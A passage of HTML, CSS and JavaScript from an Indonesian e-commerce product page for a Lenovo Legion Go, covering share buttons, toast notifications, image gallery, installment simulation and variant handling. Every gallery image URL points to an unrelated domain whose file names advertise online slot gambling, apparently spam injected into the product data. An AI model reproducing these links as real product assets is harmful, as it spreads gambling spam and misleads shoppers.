9.935 0 0024 4.59z"/></svg></span><span class="pd-share-name">Twitter</span></a><a href="#" class="pd-share-option" data-share="telegram" target="_blank" rel="noopener"><span class="pd-share-icon pd-share-icon-telegram"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg></span><span class="pd-share-name">Telegram</span></a><a href="#" class="pd-share-option" data-share="email"><span class="pd-share-icon pd-share-icon-email"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></span><span class="pd-share-name">Email</span></a><button type="button" class="pd-share-option" data-share="copy"><span class="pd-share-icon pd-share-icon-copy"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></span><span class="pd-share-name">Salin Link</span></button><button type="button" class="pd-share-option" data-share="pdf"><span class="pd-share-icon pd-share-icon-pdf"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11zM8 15.5h1.5c.83 0 1.5-.67 1.5-1.5v-1c0-.83-.67-1.5-1.5-1.5H8v4zm6 0h1c1.1 0 2-.9 2-2v-2c0-1.1-.9-2-2-2h-1v6zm-4.5-1.5H8v-1h1.5v1zM14 13h1v1h-1v-1z"/></svg></span><span class="pd-share-name">Export PDF</span></button></div><div class="pd-share-copy-section"><div class="pd-share-copy-input-wrap"><input type="text" class="pd-share-copy-input" id="pd-share-url-input" value="https://shortt.ink/anakbinjai" readonly><button type="button" class="pd-share-copy-btn" id="pd-share-copy-url-btn"><svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg><span class="pd-share-copy-text">Salin</span></button></div></div></div></div></div>

<style>.toast-root{position:fixed;left:50%;bottom:18px;transform:translateX(-50%);display:flex;flex-direction:column;gap:10px;z-index:99999;pointer-events:none;max-width:min(92vw,540px)}.toast{display:grid;grid-template-columns:28px 1fr auto;gap:12px;background:#0b1220;color:#eef3ff;border:1px solid rgba(255,255,255,.08);padding:12px 14px;border-radius:12px;box-shadow:0 10px 30px rgba(10,10,20,.35);pointer-events:auto;overflow:hidden}.toast .ico{align-self:start;margin-top:2px}.toast .ttl{font-weight:700;line-height:1.25;font-size:14px;margin-bottom:4px}.toast .msg{opacity:.95;line-height:1.45;font-size:13px}.toast .actions{display:flex;gap:8px;align-self:center}.toast .btn{background:#0ea5e9;color:#fff;border:0;border-radius:999px;padding:8px 12px;font-size:12px;font-weight:700;cursor:pointer}.toast .btn.alt{background:transparent;color:#8fb5ff;border:1px solid rgba(143,181,255,.35)}.toast .close{background:transparent;border:0;color:#98a2b3;cursor:pointer;padding:4px;margin-left:6px}.toast.success{border-left:4px solid #22c55e}.toast.info{border-left:4px solid #0ea5e9}.toast.warn{border-left:4px solid #f59e0b}.toast .progress{position:absolute;left:0;bottom:0;height:3px;background:linear-gradient(90deg,#60a5fa,#22c55e);width:100%;transform-origin:left;animation:toastBar linear forwards}@keyframes toastBar{from{transform:scaleX(1)}to{transform:scaleX(0)}}@media(max-width:640px){.toast{grid-template-columns:24px 1fr auto;padding:12px}.toast .btn{padding:7px 10px}}</style>
<style>
.toast .msg { word-break: break-word; overflow-wrap: anywhere; }

.toast-root { bottom: max(12px, env(safe-area-inset-bottom, 12px)); }

@media (max-width: 540px) {
  .toast-root {
    left: 0; right: 0; transform: none;
    padding: 0 12px;
    bottom: calc(max(12px, env(safe-area-inset-bottom, 12px)) + var(--fab-offset, 72px));
    max-width: none;
  }
  .toast {
    grid-template-columns: 1fr; /* 1 kolom */
    position: relative;
    padding: 14px 14px 12px 14px;
    border-radius: 16px;
  }
  .toast .ico {
    position: absolute; left: 14px; top: 14px;
    margin: 0; transform: translateY(1px);
  }
  .toast .cnt { padding-left: 34px; }
  .toast .ttl { font-size: 15px; margin-bottom: 6px; }
  .toast .msg { font-size: 13px; opacity: .96; }
  .toast .actions {
    margin-top: 12px; gap: 10px; width: 100%;
    display: grid; grid-template-columns: 1fr 1fr;
  }
  .toast .btn { width: 100%; min-width: 0; padding: 10px 0; }
  .toast .close { position: absolute; right: 6px; top: 6px; }
}
</style>

<script nonce="se3iyzEHMc9FQEB4wSyd0w==">
(function adjustToastFabOffset(){
  const root = document.getElementById('toastRoot');
  if (!root) return;

  function isVisible(el){
    if (!el) return false;
    const cs = getComputedStyle(el);
    if (cs.display === 'none' || cs.visibility === 'hidden' || cs.opacity === '0') return false;
    const r = el.getBoundingClientRect();
    return r.width > 0 && r.height > 0;
  }

  function update(){
    const fab = document.getElementById('pd-mobile-fab');
    let extra = 16;
    if (isVisible(fab)) {
      const h = Math.round(fab.getBoundingClientRect().height) || 56;
      extra = h + 16; // FAB height + margin
    }
    root.style.setProperty('--fab-offset', extra + 'px');
  }

  window.addEventListener('resize', update, { passive: true });
  const fab = document.getElementById('pd-mobile-fab');
  if (window.ResizeObserver && fab) {
    const ro = new ResizeObserver(update);
    ro.observe(fab);
  }
  
  update();
})();
</script>
<div class="toast-root" id="toastRoot" aria-live="polite" aria-atomic="true"></div>

<script nonce="se3iyzEHMc9FQEB4wSyd0w==">(function(){const root=document.getElementById('toastRoot');function svgIcon(kind){if(kind==='success')return '<svg width="24" height="24" viewBox="0 0 24 24" fill="#22c55e"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.7-7.7 1.4 1.4z"/></svg>';if(kind==='warn')return '<svg width="24" height="24" viewBox="0 0 24 24" fill="#f59e0b"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>';return '<svg width="24" height="24" viewBox="0 0 24 24" fill="#0ea5e9"><path d="M11 7h2v2h-2zm0 4h2v6h-2z"/><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2z" fill="none" stroke="#0ea5e9"/></svg>'}
window.showToast=function(opts){const o=Object.assign({title:'',message:'',type:'info',duration:4000,actions:[]},opts||{});const el=document.createElement('div');el.className='toast '+(o.type||'info');el.setAttribute('role','status');el.style.position='relative';const acts=(o.actions||[]).map(a=>{const lab=a.label||'OK';const cls='btn'+(a.variant==='alt'?' alt':'');return `<button type="button" class="${cls}" data-act="${lab}">${lab}</button>`}).join('');el.innerHTML=`<div class="ico" aria-hidden="true">${svgIcon(o.type)}</div><div class="cnt">${o.title?`<div class="ttl">${o.title}</div>`:''}${o.message?`<div class="msg">${o.message}</div>`:''}</div><div class="actions">${acts}</div><button type="button" class="close" aria-label="Tutup" title="Tutup"><svg width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M18.3 5.71L12 12.01l-6.3-6.3-1.4 1.41 6.3 6.3-6.3 6.3 1.4 1.41 6.3-6.3 6.3 6.3 1.41-1.41-6.3-6.3 6.3-6.3z"/></svg></button><div class="progress" style="animation-duration:${Math.max(1500,o.duration)}ms"></div>`;

    const close = ()=> {
      if (!el.parentNode) return;
      el.style.transition = 'transform .2s ease, opacity .2s ease';
      el.style.opacity = '0'; el.style.transform = 'translateY(10px)';
      setTimeout(()=>{ if (el.parentNode) el.parentNode.removeChild(el); }, 220);
    };

    el.querySelector('.close').addEventListener('click', close);
    el.querySelectorAll('.actions .btn').forEach(btn=>{
      btn.addEventListener('click', ()=>{
        const lab = btn.getAttribute('data-act');
        try {
          (o.actions||[]).forEach(a=>{ if (a.label===lab && typeof a.onClick==='function') a.onClick(); });
        } catch(_){}
        close();
      });
    });

    root.appendChild(el);
    setTimeout(close, o.duration);
    return el;
  };
})();

const _0x1a2b=[{"url":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp","alt":"Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Win 11 Home/Eclipse Black/3Y","slug":""},{"url":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp","alt":"Lenovo Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Wi...","slug":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp"},{"url":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp","alt":"Lenovo Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Wi...","slug":"lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-223.webp"},{"url":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp","alt":"Lenovo Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Wi...","slug":"lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-776.webp"},{"url":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp","alt":"Lenovo Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Wi...","slug":"lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-634.webp"},{"url":"https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp","alt":"Lenovo Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Wi...","slug":"lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-892.webp"}],_0x3c4d="Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Win 11 Home/Eclipse Black/3Y",_0x5e6f="SB0B3T";function getVariantSummaryText(){const a=document.getElementById('pd-variant-summary');if(!a)return '';const b=Array.from(a.querySelectorAll('.vs-item strong')).map(c=>c.textContent.trim()).filter(Boolean);return b.length?b.join(' / '):''}
function encodeVariantHash(id){if(!id||id<=0)return '';const xor=id^0x4A5D;return xor.toString(36)}
function decodeVariantHash(hash){if(!hash)return 0;const xor=parseInt(hash,36);return isNaN(xor)?0:xor^0x4A5D}

function showSuccessToast(productId,qty,variantId){const variantText=getVariantSummaryText();const skuText=(function(){const el=document.getElementById('pd-sku');return el?el.textContent.trim():PD_SKU})();showToast({type:'warn',title:'Fitur Segera Hadir',message:`<strong>${escapeHtml(PD_NAME)}</strong>${variantText?` Â· <em>${escapeHtml(variantText)}</em>`:''}<br>SKU: ${escapeHtml(skuText)} Â· Qty: ${qty}`,duration:5000,actions:[{label:'Lihat Keranjang',onClick:()=>{}},{label:'Lanjut Belanja',variant:'alt',onClick:()=>{}}]});try{if(window.ga4Ecomm){const qtySend=qty||1;window.ga4Ecomm.addToCart({currency:'IDR',price:20789000,quantity:qtySend,item_id:"SB0B3T",item_name:"Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Win 11 Home/Eclipse Black/3Y",item_brand:"Lenovo ",item_category:(["Komputer & Laptop","Laptop","Gaming"]||[]).join(' / ')})}}catch(_){}return false}function showErrorToast(){showToast({type:'error',title:'Gagal Menambah ke Keranjang',message:'Terjadi kesalahan saat memproses permintaan. Silakan coba lagi.',duration:5000})}

function executeBuyNowLegacy(id,variantId){const a=getVariantSummaryText(),b=(function(){const c=document.getElementById('pd-sku');return c?c.textContent.trim():_0x5e6f})();

    let willRedirect = false;
    try {
        if (window.addToCart) {
            window.addToCart(id, 1, variantId);
            willRedirect = false;
        }
    } catch(_){}

    if (willRedirect) {
        showToast({
            type: 'info',
            title: 'Menuju Keranjang',
            message: `<strong>${escapeHtml(PD_NAME)}</strong>${variantText?` Â· <em>${escapeHtml(variantText)}</em>`:''}<br>SKU: ${escapeHtml(skuText)} Â· Qty: 1`,
            duration: 1800
        });
        setTimeout(()=>{ window.location.href='/keranjang'; }, 1200);
    } else {
        showToast({
            type: 'warn',
            title: 'Fitur Beli Langsung Segera Hadir',
            message: `Sementara ini Anda bisa menambahkan produk ke keranjang terlebih dahulu.<br><strong>${escapeHtml(PD_NAME)}</strong>${variantText?` Â· <em>${escapeHtml(variantText)}</em>`:''}`,
            duration: 6000,
            actions: [
                { label: '+ Keranjang', onClick: ()=> { try{ if (window.addToCart) window.addToCart(id,1,variantId); }catch(_){} } },
                { label: 'Hubungi CS', variant: 'alt', onClick: ()=> { window.open('https://wa.me/6281380009898','_blank'); } }
            ]
        });
    }
}

document.addEventListener('DOMContentLoaded',function(){var a=document.getElementById('pd-buy-form');if(a){a.addEventListener('submit',function(e){var b=parseInt(a.getAttribute('data-pid'),10)||0;if(window.addToCartSubmit){return window.addToCartSubmit(e,b)}})}});document.addEventListener('DOMContentLoaded',function(){var a=document.getElementById('btn-buy');if(a){a.addEventListener('click',function(){var b=a.getAttribute('data-id');buyNow(b)})}});

function _0x2m3n(s){return String(s||'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]))}

(function initGallery(){const mainImg=document.getElementById('pd-main-img');const gallery=document.getElementById('pd-thumb-gallery');if(!mainImg||!gallery)return;gallery.addEventListener('click',function(ev){const btn=ev.target.closest('.pd-thumb-btn');if(!btn)return;const full=btn.getAttribute('data-full');if(full){mainImg.src=full;const alt=btn.getAttribute('data-alt')||'';if(alt)mainImg.alt=alt;const slug=btn.getAttribute('data-slug')||'';if(slug)mainImg.dataset.slug=slug;gallery.querySelectorAll('.pd-thumb-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active')}})})();

(function initMobileSliderCounter(){const slider=document.getElementById('pd-mobile-slider');const counter=document.getElementById('pd-gallery-counter');if(!slider||!counter)return;let ticking=false;slider.addEventListener('scroll',function(){if(!ticking){window.requestAnimationFrame(function(){const slides=slider.querySelectorAll('.pd-mslide');if(!slides.length)return;const containerRect=slider.getBoundingClientRect();const containerCenter=containerRect.left+containerRect.width/2;let currentIdx=0;let minDist=Infinity;slides.forEach((slide,idx)=>{const slideRect=slide.getBoundingClientRect();const slideCenter=slideRect.left+slideRect.width/2;const dist=Math.abs(slideCenter-containerCenter);if(dist<minDist){minDist=dist;currentIdx=idx}});counter.textContent=(currentIdx+1)+'/'+slides.length;ticking=false});ticking=true}},{passive:true})})();

/* ================= Simulasi Cicilan ================= */
(function initInstallmentList(){const card=document.getElementById('inst-card');if(!card)return;function getBasePrice(){return parseInt(card.getAttribute('data-base-price')||'0',10)||0}function setBasePrice(v){card.setAttribute('data-base-price',String(parseInt(v||'0',10)||0))}const zeroEligible=card.getAttribute('data-zero-smart')==='1';window.initMobile=zeroEligible;const listEl=document.getElementById('inst-month-list');const zeroNote=document.getElementById('inst-zero-note');const tenors=[3,6,12];const rates={BRI:{3:0.975,6:0.975,12:0.975},Mandiri:{3:0.984,6:0.9725,12:0.96},BCA:{3:0.97,6:0.94,12:0.91}};function formatRupiah(num){return 'Rp '+(Math.round(num)).toString().replace(/\B(?=(\d{3})+(?!\d))/g,'.')}function activeBank(){const tab=card.querySelector('.bank-tab.active');return tab?tab.dataset.bank:'BRI'}

function _0x4o5p(bank){const a=getBasePrice();listEl.innerHTML='';const b=rates[bank]||{};let c=false;tenors.forEach(m=>{let d=b[m]??1;if(zeroEligible&&(bank==='BRI'||bank==='Mandiri')){d=1;c=true}const e=a/d;const f=m>0?Math.ceil((e/m)/100)*100:0;const g=document.createElement('li');g.className='inst-month-item';g.innerHTML=`<span class="tenor-badge">${m}x</span><span class="amount">${formatRupiah(f)} / bln</span>${zeroEligible&&(bank==='BRI'||bank==='Mandiri')?'<span class="tag tag-zero">0%</span>':''}`;listEl.appendChild(g)});zeroNote.style.display=c?'block':'none'}

card.addEventListener('click',function(ev){const a=ev.target.closest('.bank-tab');if(!a)return;card.querySelectorAll('.bank-tab').forEach(b=>{b.classList.remove('active');b.setAttribute('aria-selected','false')});a.classList.add('active');a.setAttribute('aria-selected','true');_0x4o5p(a.dataset.bank)});

window.instSetBasePrice=function(newPrice){setBasePrice(newPrice);_0x4o5p(activeBank())};_0x4o5p(activeBank());
})();

/* ====== Fokus gambar varian ====== */
function _0x6q7r(s){return String(s||'').toLowerCase().replace(/[^a-z0-9]+/g,'')}function _0x8s9t(u){try{return new URL(u,window.location.origin).pathname.split('/').pop().toLowerCase()}catch(e){try{return(u||'').split('/').pop().toLowerCase()}catch(_){return ''}}}
function _0xau1v(url,altOpt){const a=document.getElementById('pd-main-img'),b=document.getElementById('pd-thumb-gallery'),c=document.getElementById('pd-mobile-slider');if(a&&url){a.src=url;if(altOpt)a.alt=altOpt}if(b){const d=_0x8s9t(url);let e=null;b.querySelectorAll('.pd-thumb-btn').forEach(btn=>{const f=btn.getAttribute('data-full')||'',g=_0x8s9t(f)===d;if(g)e=btn;btn.classList.toggle('active',g)});if(e){const h=e.getAttribute('data-alt')||'',i=e.getAttribute('data-slug')||'';if(h&&a)a.alt=h;if(i&&a)a.dataset.slug=i}}
  if (c){
    const targetName = _0x8s9t(url);
    const slideImg = Array.from(c.querySelectorAll('img')).find(im => _0x8s9t(im.src) === targetName);
    if (slideImg){
      
      try {
        const container = c;
        const imgRect = slideImg.getBoundingClientRect();
        const contRect = container.getBoundingClientRect();
        const offsetLeft = slideImg.offsetLeft - container.offsetLeft;
        const center = offsetLeft - (container.clientWidth - slideImg.clientWidth) / 2;
        container.scrollTo({ left: Math.max(0, center), behavior: 'smooth' });
      } catch(_){
        
        slideImg.scrollIntoView({ behavior:'smooth', inline:'center', block:'nearest' });
      }
    }
  }
}
function findImageForVariant(variant){
  if (!variant || !variant.attrs) return null;
  const tokens = [];
  try{
    Object.values(variant.attrs).forEach(v=>{
      if (!v) return;
      const raw = String(v);
      tokens.push(raw);
      tokens.push(normalize(raw));
    });
  }catch(_){}
  if (variant.sku){
    tokens.push(String(variant.sku));
    tokens.push(normalize(String(variant.sku)));
  }
  if (variant.image_url) {
      tokens.push(String(variant.image_url));
  }
  let best = null;
  let bestScore = -1;

  for (const g of (galleryData||[])){
    const slugN = normalize(g.slug||'');
    const altN  = normalize(g.alt||'');
    const file  = _0x8s9t(g.url||'');
    const fileN = normalize(file);
    const imgU  = g.url;

    for (const t of tokens){
      const tN = normalize(t);
      if (!tN) continue;

      let score = -1;
      if (imgU === tN) score = 300;
      if (slugN && slugN === tN) score = 300;
      else if (fileN && fileN.includes(tN)) score = 200;
      else if (altN && altN.includes(tN)) score = 120;

      if (score > bestScore){
        bestScore = score;
        best = g;
      }
      if (bestScore >= 300) break;
    }
    if (bestScore >= 300) break;
  }
  return bestScore >= 120 ? best : null;
}
function _0xey3z(variant){const a=_0xcw2x(variant);if(a&&a.url){_0xau1v(a.url,a.alt||'')}}

/* ====== Layout mobile ====== */
(function _0xg04h(){const a=document.querySelector('.pd-media-card'),b=document.getElementById('pd-price-block'),c=document.getElementById('pd-price-anchor'),d=document.querySelector('.pd-info-card'),e=document.getElementById('pd-title'),f=document.getElementById('pd-variant-combined'),g=document.getElementById('pd-variants'),h=document.getElementById('pd-variants-anchor'),i=document.getElementById('pd-variant-summary'),j=document.getElementById('pd-summary-anchor'),titleRow=document.querySelector('.pd-title-row'),promoBanner=document.querySelector('.promo-endyear-mini-banner'),compareSection=document.querySelector('.pd-compare-section');if(!a||!b||!c||!d||!e)return;

    let pricePlaced = false;
    let varPlaced = false;
    let titlePlaced = false;
    let promoPlaced = false;
    const mq = window.matchMedia('(max-width: 640px)');

    function apply(){
        if (mq.matches) {
            if (!titlePlaced && a && titleRow && d.contains(titleRow)) { try{a.appendChild(titleRow);titlePlaced=true;}catch(_){} }
            if (!pricePlaced && a && b) { try{a.appendChild(b);pricePlaced=true;}catch(_){} }
            if (!varPlaced && f && d && e) {
                try{
                    f.hidden = false;
                    if (i && !f.contains(i)) f.appendChild(i);
                    if (g && !f.contains(g)) f.appendChild(g);
                    if(d.contains(e))d.insertBefore(f, e);
                    varPlaced = true;
                }catch(_){}
            }
            if (!promoPlaced && promoBanner && compareSection && compareSection.parentNode) {
                try{
                    compareSection.parentNode.insertBefore(promoBanner, compareSection);
                    promoPlaced = true;
                }catch(_){}
            }
        } else {
            if (titlePlaced && titleRow && d) {
                try{
                    const vcombined = document.getElementById('pd-variant-combined');
                    if (vcombined && d.contains(vcombined)) {
                        d.insertBefore(titleRow, vcombined);
                    } else {
                        d.insertBefore(titleRow, d.firstChild);
                    }
                    titlePlaced=false;
                }catch(_){}
            }
            if (pricePlaced && b && c && c.parentNode) {
                try{c.parentNode.insertBefore(b, c.nextSibling);pricePlaced=false;}catch(_){}
            }
            if (varPlaced) {
                try{
                    if (i && j && j.parentNode && !j.parentNode.contains(i)) j.parentNode.insertBefore(i, j.nextSibling);
                    if (g && h && h.parentNode && !h.parentNode.contains(g)) h.parentNode.insertBefore(g, h.nextSibling);
                    if (f) { f.hidden = true; f.innerHTML = ''; }
                    varPlaced = false;
                }catch(_){}
            }
            if (promoPlaced && promoBanner && b) {
                try{
                    b.appendChild(promoBanner);
                    promoPlaced = false;
                }catch(_){}
            }
        }
    }

    mq.addEventListener ? mq.addEventListener('change', apply) : mq.addListener(apply);
    apply();

    const fab = document.getElementById('pd-mobile-fab');
    if (fab) {
        const pid = parseInt(fab.getAttribute('data-pid')||'0',10) || 325;
        const btnCart = document.getElementById('mf-cart');

        if (btnCart) btnCart.addEventListener('click', function(){
            const varInput = document.getElementById('pd-variant-id');
            const variantId = varInput ? parseInt(varInput.value||'0',10) : 0;
            try { if (window.addToCart) addToCart(pid, 1, variantId); } catch(_){}
            const variantText = getVariantSummaryText();
            const skuText = (function(){ const el=document.getElementById('pd-sku'); return el?el.textContent.trim():PD_SKU; })();
            showToast({
                type: 'success',
                title: 'Berhasil ditambahkan ke Keranjang',
                message: `<strong>${escapeHtml(PD_NAME)}</strong>${variantText?` Â· <em>${escapeHtml(variantText)}</em>`:''}<br>SKU: ${escapeHtml(skuText)} Â· Qty: 1`,
                duration: 5000,
                actions: [
                    { label: 'Lihat Keranjang', onClick: ()=> { window.location.href = '/keranjang'; } },
                    { label: 'Lanjut Belanja', variant: 'alt', onClick: ()=>{} }
                ]
            });
        });
    }
})();

/* ====== Auto-hide installment banner if sidebar too tall (Desktop only) ====== */
(function(){
    function adjustSidebarBanner() {
        if (window.innerWidth <= 768) return;
        const sidebar = document.querySelector('.pd-sidebar');
        const infoCard = document.querySelector('.pd-info-card');
        const banner = document.querySelector('.pd-side-card.inst-alt-banner.inst-alt-banner--compact');
        if (!sidebar || !infoCard || !banner) return;
        const sidebarHeight = sidebar.offsetHeight;
        const infoCardHeight = infoCard.offsetHeight;
        if (sidebarHeight > infoCardHeight) {
            banner.style.display = 'none';
        } else {
            banner.style.display = '';
        }
    }
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', adjustSidebarBanner);
    } else {
        adjustSidebarBanner();
    }
    let resizeTimer;
    window.addEventListener('resize', function() {
        clearTimeout(resizeTimer);
        resizeTimer = setTimeout(adjustSidebarBanner, 250);
    });
    const pwpSection = document.getElementById('pwp-deals-section');
    if (pwpSection) {
        const observer = new MutationObserver(function(mutations) {
            let shouldRecheck = false;
            mutations.forEach(function(mutation) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'hidden') {
                    shouldRecheck = true;
                } else if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    shouldRecheck = true;
                }
            });
            if (shouldRecheck) {
                setTimeout(adjustSidebarBanner, 100);
            }
        });
        observer.observe(pwpSection, {
            attributes: true,
            childList: true,
            subtree: true
        });
    }
    window.adjustSidebarBanner = adjustSidebarBanner;
})();

/* ====== Global constants ====== */
const IS_DIGITAL=false;
const IS_PREORDER=false;

/* ====== Variants state (REVISED) ====== */
(function initVariants(){
const _0x7g8h=[];window.variants=_0x7g8h;
window.isPreorderProduct=false;
    const attrOrder = [];

    if (!variants.length || !attrOrder.length) return;

    function comboKey(sel){
        return attrOrder.map(a => a + '=' + (sel[a] ?? '')).join('|');
    }

    const variantMap = {};
    variants.forEach(v=>{
        const key = comboKey(v.attrs);
        variantMap[key] = v;
    });

    function readSelection(){
        const sel = {};
        attrOrder.forEach(a=>{
            const r = document.querySelector(`.v-group[data-attr="${CSS.escape(a)}"] input[type=radio]:checked`);
            sel[a] = r ? r.value : '';
        });
        return sel;
    }

    function findVariant(sel){
        return variantMap[comboKey(sel)] || null;
    }

    function autoFillMissing(sel){
        let changed = false;
        for (const a of attrOrder) {
            if (sel[a]) continue;
            const possible = [];
            const seen = new Set();
            variants.forEach(v=>{
                let ok = true;
                for (const a2 of attrOrder) {
                    if (a2 === a) continue;
                    if (sel[a2] && v.attrs[a2] !== sel[a2]) { ok = false; break; }
                }
                if (ok) {
                    const val = v.attrs[a];
                    if (!seen.has(val)) { seen.add(val); possible.push(val); }
                }
            });
            if (possible.length === 1) {
                const val = possible[0];
                const input = document.querySelector(`.v-group[data-attr="${CSS.escape(a)}"] input[type=radio][value="${CSS.escape(val)}"]`);
                if (input && !input.checked) { input.checked = true; sel[a] = val; changed = true; }
            }
        }
        return changed;
    }

    function rupiah(n){
        n = parseInt(n||0,10)||0;
        return 'Rp ' + n.toString().replace(/\B(?=(\d{3})+(?!\d))/g,'.');
    }
    
    function focusGalleryByUrl(imageUrl) {
        const isMobile = window.matchMedia && window.matchMedia('(max-width: 640px)').matches;
          if (isMobile) {
            _0xau1v(imageUrl);
            return;
          }
        
          const gallery = document.getElementById('pd-thumb-gallery');
          const targetName = _0x8s9t(imageUrl);
        
          if (gallery) {
            const btns = Array.from(gallery.querySelectorAll('.pd-thumb-btn'));
            const btn = btns.find(b => _0x8s9t(b.getAttribute('data-full') || '') === targetName);
            if (btn) { btn.click(); return; }
          }
          
          _0xau1v(imageUrl);
    }
    

function formatStockLabel(n){n=parseInt(n||0,10)||0;return(n>10)?'10+':String(n)}
function updateBranchPopover(v){try{if(!v)return;const a=document.getElementById('sp-qty-meg'),b=document.getElementById('sp-qty-mdf'),c=document.getElementById('sp-qty-bda');if(a)a.textContent=formatStockLabel(Math.max(0,v.smm|0));if(b)b.textContent=formatStockLabel(Math.max(0,v.smf|0));if(c)c.textContent=formatStockLabel(Math.max(0,v.sba|0))}catch(_){}}

    function calcVoucherDisc(type,value,price,maxDisc){if(type==='PERCENTAGE'){let d=(price*value)/100;if(maxDisc>0&&d>maxDisc)d=maxDisc;return Math.round(d)}return Math.round(value)}

    function applyVariant(v, focusImage = true){
        const elCur  = document.getElementById('pd-price-current');
        const elOri  = document.getElementById('pd-price-original');
        const elDisc = document.getElementById('pd-discount-badge');
        const elSku  = document.getElementById('pd-sku');
        const elStock= document.getElementById('pd-stock-badge');
        const elQty  = document.getElementById('qty');
        const btnAdd = document.getElementById('btn-add-cart');
        const btnBuy = document.getElementById('btn-buy');
        const hidVar = document.getElementById('pd-variant-id');

        const mfCart= document.getElementById('mf-cart');
        const mfBuy = document.getElementById('mf-buy');
        const fab = document.getElementById('pd-mobile-fab');

        if (hidVar) hidVar.value = v ? v.id : 0;
        if (elCur) elCur.textContent = rupiah(v ? v.final : 0);
        if (elSku && v && v.sku) elSku.textContent = v.sku;

        if (v && v.ori > v.final) {
            if (elOri) { elOri.style.display='inline'; elOri.textContent = rupiah(v.ori); }
            if (elDisc) { elDisc.style.display='inline'; elDisc.textContent = '-' + (v.disc||0) + '%'; }
        } else {
